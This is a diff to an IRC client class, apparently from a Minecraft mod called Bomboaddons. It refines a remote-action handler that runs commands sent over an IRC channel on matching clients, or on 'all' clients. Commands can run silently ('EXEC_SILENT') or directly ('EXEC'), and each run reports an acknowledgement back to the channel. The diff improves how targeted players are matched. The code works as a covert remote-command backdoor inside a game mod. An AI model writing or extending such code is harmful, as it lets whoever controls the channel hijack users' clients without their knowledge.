@@ -1013,21 +1013,22 @@ public class IRCClient {
 
    public static void executeRemoteAction(String action, String targetPlayer, String value) {
       Minecraft mc = Minecraft.getInstance();
-      if (mc == null) return;
-      String selfName = mc.getUser() != null ? mc.getUser().getName() : "";
+      String selfUser = mc.getUser() != null ? mc.getUser().getName() : "";
+      String selfPlayer = mc.player != null ? mc.player.getScoreboardName() : "";
       String cleanTarget = cleanSenderName(targetPlayer);
-      String cleanSelf = cleanSenderName(selfName);
       boolean match = cleanTarget.isEmpty()
             || cleanTarget.equalsIgnoreCase("all")
             || cleanTarget.equalsIgnoreCase("self")
-            || (cleanSelf != null && !cleanSelf.isEmpty() && cleanTarget.equalsIgnoreCase(cleanSelf));
+            || (!selfUser.isEmpty() && cleanTarget.equalsIgnoreCase(cleanSenderName(selfUser)))
+            || (!selfPlayer.isEmpty() && cleanTarget.equalsIgnoreCase(cleanSenderName(selfPlayer)));
       if (match) {
+         String ackName = !selfPlayer.isEmpty() ? cleanSenderName(selfPlayer) : cleanSenderName(selfUser);
          if ("EXEC_SILENT".equalsIgnoreCase(action)) {
             BomboaddonsClient.executeSilentCommand(value);
-            sendAck(selfName, value);
+            sendAck(ackName, value);
          } else if ("EXEC".equalsIgnoreCase(action)) {
             executeDirectCommand(value);
-            sendAck(selfName, value);
+            sendAck(ackName, value);
          } else if ("TITLE".equalsIgnoreCase(action)) {
             BomboaddonsClient.showTitle(value);
          } else if ("SOUND".equalsIgnoreCase(action)) {
@@ -1092,8 +1093,9 @@ public class IRCClient {
       if (!running) return;
       (new Thread(() -> {
          try {
+            String clean = cleanSenderName(ign);
             String timeStr = new java.text.SimpleDateFormat("HH:mm:ss").format(new java.util.Date());
-            String payload = "[CMD_ACK]\u0002" + ign + "\u0002" + command + "\u0002" + timeStr;
+            String payload = "[CMD_ACK]\u0002" + clean + "\u0002" + command + "\u0002" + timeStr;
             sendRaw("PRIVMSG #bomboaddons_chat :" + payload);
          } catch (Throwable ignored) {}
       })).start();
